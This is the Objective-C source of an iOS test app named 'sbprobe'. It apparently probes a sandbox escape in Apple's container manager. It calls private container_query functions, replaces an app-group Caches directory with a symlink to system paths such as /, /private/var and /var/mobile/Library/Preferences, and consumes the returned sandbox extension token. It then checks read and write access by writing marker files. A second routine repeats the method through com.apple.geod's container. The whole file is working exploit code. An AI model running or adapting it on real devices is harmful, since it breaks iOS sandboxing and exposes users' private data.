// sbprobe — test the MCM part-directory symlink beyond MCM containers.
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <Security/Security.h>
#import <mach/mach.h>
#import <dlfcn.h>
#import <sys/stat.h>
#import <dirent.h>
#import <unistd.h>
#import <errno.h>

typedef void *(*fn_create)(void);
typedef void (*fn_set_u64)(void *, uint64_t);
typedef void (*fn_set_obj)(void *, void *);
typedef void (*fn_set_cstr)(void *, const char *);
typedef void *(*fn_get_one)(void *);
typedef char *(*fn_copy_token)(void *);
typedef const char *(*fn_get_path)(void *);
typedef void (*fn_free)(void *);
typedef int64_t (*fn_consume)(const char *);
typedef int64_t (*fn_release)(int64_t);
typedef void *(*fn_xpc_string)(const char *);
typedef void (*fn_xpc_release)(void *);

static fn_create q_create;
static fn_set_u64 q_class, q_part, q_flags;
static fn_set_obj q_ids, q_set_ids;
static fn_set_cstr q_domain;
static fn_get_one q_get;
static fn_copy_token q_token;
static fn_get_path q_path;
static fn_free q_free;
static fn_consume s_consume;
static fn_release s_release;
static fn_xpc_string xpc_string;
static fn_xpc_release xpc_release_fn;
static NSString *gGroup;

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[sbprobe] %@", s);
}

static BOOL loadMCM(void) {
    void *h = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!h) { L(@"MCM dlopen failed: %s", dlerror()); return NO; }
    q_create = (fn_create)dlsym(h, "container_query_create");
    q_class = (fn_set_u64)dlsym(h, "container_query_set_class");
    q_ids = (fn_set_obj)dlsym(h, "container_query_set_group_identifiers");
    q_set_ids = (fn_set_obj)dlsym(h, "container_query_set_identifiers");
    q_part = (fn_set_u64)dlsym(h, "container_query_operation_set_part");
    q_domain = (fn_set_cstr)dlsym(h, "container_query_operation_set_part_domain");
    q_flags = (fn_set_u64)dlsym(h, "container_query_operation_set_flags");
    q_get = (fn_get_one)dlsym(h, "container_query_get_single_result");
    q_token = (fn_copy_token)dlsym(h, "container_copy_sandbox_token");
    q_path = (fn_get_path)dlsym(h, "container_object_get_path");
    q_free = (fn_free)dlsym(h, "container_query_free");
    s_consume = (fn_consume)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    s_release = (fn_release)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    xpc_string = (fn_xpc_string)dlsym(RTLD_DEFAULT, "xpc_string_create");
    xpc_release_fn = (fn_xpc_release)dlsym(RTLD_DEFAULT, "xpc_release");
    L(@"MCM load create=%p get=%p token=%p consume=%p xpc=%p", q_create, q_get, q_token, s_consume, xpc_string);
    return q_create && q_get && q_token && s_consume;
}

static NSString *findGroup(void) {
    NSArray *ids = @[@"group.8e0bc870a21520b9.1", @"group.8e0bc870a21520b9.2",
                     @"group.8e0bc870a21520b9.3", @"group.8e0bc870a21520b9.4",
                     @"group.8e0bc870a21520b9.5"];
    NSFileManager *fm = [NSFileManager defaultManager];
    for (NSString *gid in ids) {
        NSURL *u = [fm containerURLForSecurityApplicationGroupIdentifier:gid];
        if (u.path.length) { L(@"group %@ root %@", gid, u.path); return gid; }
    }
    L(@"no app group container");
    return nil;
}

static int64_t queryEscape(NSString *gid, NSString *target, uint64_t flags, NSString **outPath) {
    NSString *groot = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:gid].path;
    if (!groot.length) return -6;
    NSString *lib = [groot stringByAppendingPathComponent:@"Library"];
    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
    NSString *bak = [lib stringByAppendingPathComponent:@"Caches.sbprobe"];
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:nil];
    [fm removeItemAtPath:bak error:nil];
    if ([fm fileExistsAtPath:caches]) {
        NSError *e = nil;
        if (![fm moveItemAtPath:caches toPath:bak error:&e]) { L(@"move caches failed %@", e); return -2; }
    }
    unlink(caches.fileSystemRepresentation);
    if (symlink(target.fileSystemRepresentation, caches.fileSystemRepresentation) != 0) {
        L(@"symlink %@ failed errno=%d", target, errno);
        if ([fm fileExistsAtPath:bak]) [fm moveItemAtPath:bak toPath:caches error:nil];
        return -2;
    }
    void *q = q_create();
    q_class(q, 7);
    void *x = xpc_string ? xpc_string(gid.UTF8String) : NULL;
    q_ids(q, x);
    q_part(q, 3);
    q_flags(q, flags);
    void *res = q_get(q);
    const char *p = (res && q_path) ? q_path(res) : NULL;
    char *tok = (res && q_token) ? q_token(res) : NULL;
    int64_t h = (tok && s_consume) ? s_consume(tok) : -5;
    L(@"query target=%@ flags=0x%llx res=%p path=%s token=%s consume=%lld",
      target, (unsigned long long)flags, res, p ? p : "(null)", tok ? "YES" : "NO", (long long)h);
    if (tok) free(tok);
    if (q_free) q_free(q);
    if (x && xpc_release_fn) xpc_release_fn(x);
    unlink(caches.fileSystemRepresentation);
    if ([fm fileExistsAtPath:bak]) [fm moveItemAtPath:bak toPath:caches error:nil];
    if (h >= 0 && outPath) *outPath = target;
    return h;
}

static void testTarget(NSString *target) {
    L(@"--- target %@ ---", target);
    L(@"pre: opendir=%p errno=%d", opendir(target.fileSystemRepresentation), errno);
    NSString *got = nil;
    int64_t h = queryEscape(gGroup, target, 0x8000000000ULL, &got);
    if (h < 0) {
        L(@"retry flags 0x8100000000");
        h = queryEscape(gGroup, target, 0x8100000000ULL, &got);
    }
    L(@"consume=%lld", (long long)h);
    errno = 0;
    DIR *d = opendir(target.fileSystemRepresentation);
    L(@"post: opendir=%p errno=%d", d, errno);
    if (d) closedir(d);
    NSString *marker = [target stringByAppendingPathComponent:@"sbprobe_marker"];
    errno = 0;
    int fd = open(marker.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    L(@"write %@ fd=%d errno=%d", marker, fd, errno);
    if (fd >= 0) { write(fd, "sbprobe", 7); close(fd); unlink(marker.fileSystemRepresentation); }
    if (h >= 0 && s_release) s_release(h);
}


static int64_t class12Query(NSString *ident, NSString *target, uint64_t flags, NSString **outPath) {
    void *q = q_create();
    q_class(q, 12);
    void *x = xpc_string ? xpc_string(ident.UTF8String) : NULL;
    if (q_set_ids) q_set_ids(q, x);
    q_part(q, 3);
    q_flags(q, flags);
    void *res = q_get(q);
    const char *p = (res && q_path) ? q_path(res) : NULL;
    char *tok = (res && q_token) ? q_token(res) : NULL;
    int64_t h = (tok && s_consume) ? s_consume(tok) : -5;
    L(@"class12 direct target=%@ flags=0x%llx res=%p path=%s token=%s consume=%lld",
      target, (unsigned long long)flags, res, p ? p : "(null)", tok ? "YES" : "NO", (long long)h);
    if (tok) free(tok);
    if (q_free) q_free(q);
    if (x && xpc_release_fn) xpc_release_fn(x);
    if (h >= 0 && outPath && p) *outPath = [NSString stringWithUTF8String:p];
    return h;
}

static void testGeod(NSString *target) {
    L(@"--- geod target %@ ---", target);
    uint64_t flags[] = {0x8000000000ULL, 0x0800000000ULL, 0x8100000000ULL, 0x100000000ULL};
    NSString *caches = nil;
    int64_t h = -1;
    for (int i = 0; i < 4; i++) {
        h = class12Query(@"com.apple.geod", target, flags[i], &caches);
        if (h >= 0) break;
    }
    if (h < 0 || !caches.length) { L(@"geod: no direct token"); return; }
    if ([caches hasPrefix:@"/var/"]) caches = [@"/private" stringByAppendingString:caches];
    L(@"geod caches %@", caches);
    DIR *d = opendir(caches.fileSystemRepresentation);
    L(@"geod caches opendir=%p errno=%d", d, errno);
    if (d) closedir(d);
    NSString *bak = [caches stringByAppendingString:@".sbprobe"];
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm removeItemAtPath:bak error:nil];
    NSError *e = nil;
    if (![fm moveItemAtPath:caches toPath:bak error:&e]) { L(@"geod move failed %@", e); if (s_release) s_release(h); return; }
    unlink(caches.fileSystemRepresentation);
    if (symlink(target.fileSystemRepresentation, caches.fileSystemRepresentation) != 0) {
        L(@"geod symlink failed errno=%d", errno);
        [fm moveItemAtPath:bak toPath:caches error:nil]; if (s_release) s_release(h); return;
    }
    NSString *path2 = nil;
    int64_t h2 = class12Query(@"com.apple.geod", target, 0x8100000000ULL, &path2);
    if (h2 < 0) h2 = class12Query(@"com.apple.geod", target, 0x8000000000ULL, &path2);
    if (h2 >= 0) {
        DIR *d2 = opendir(target.fileSystemRepresentation);
        L(@"geod symlink post opendir=%p errno=%d", d2, errno);
        if (d2) closedir(d2);
        NSString *marker = [target stringByAppendingPathComponent:@"sbprobe_geod_marker"];
        errno = 0; int fd = open(marker.fileSystemRepresentation, O_CREAT|O_WRONLY|O_TRUNC, 0644);
        L(@"geod write %@ fd=%d errno=%d", marker, fd, errno);
        if (fd >= 0) { write(fd,"x",1); close(fd); unlink(marker.fileSystemRepresentation); }
        if (s_release) s_release(h2);
    }
    unlink(caches.fileSystemRepresentation);
    [fm moveItemAtPath:bak toPath:caches error:nil];
    if (s_release) s_release(h);
}

static void runProbe(void) {
    @autoreleasepool {
        L(@"=== sbprobe start uid=%d pid=%d", getuid(), getpid());
        if (!loadMCM()) return;
        gGroup = findGroup();
        if (!gGroup) return;
        NSArray *targets = @[@"/", @"/private/var", @"/var/mobile/Library/Preferences",
                            @"/var/mobile/Containers/Data", @"/System/Library"];
        for (NSString *t in targets) testTarget(t);
        for (NSString *t in targets) testGeod(t);
        L(@"=== sbprobe done ===");
    }
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@end
@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor systemBackgroundColor];
    UILabel *l = [[UILabel alloc] initWithFrame:vc.view.bounds];
    l.text = @"sbprobe"; l.textAlignment = NSTextAlignmentCenter;
    [vc.view addSubview:l];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{ runProbe(); });
    return YES;
}
@end
int main(int argc, char **argv) { @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); } }
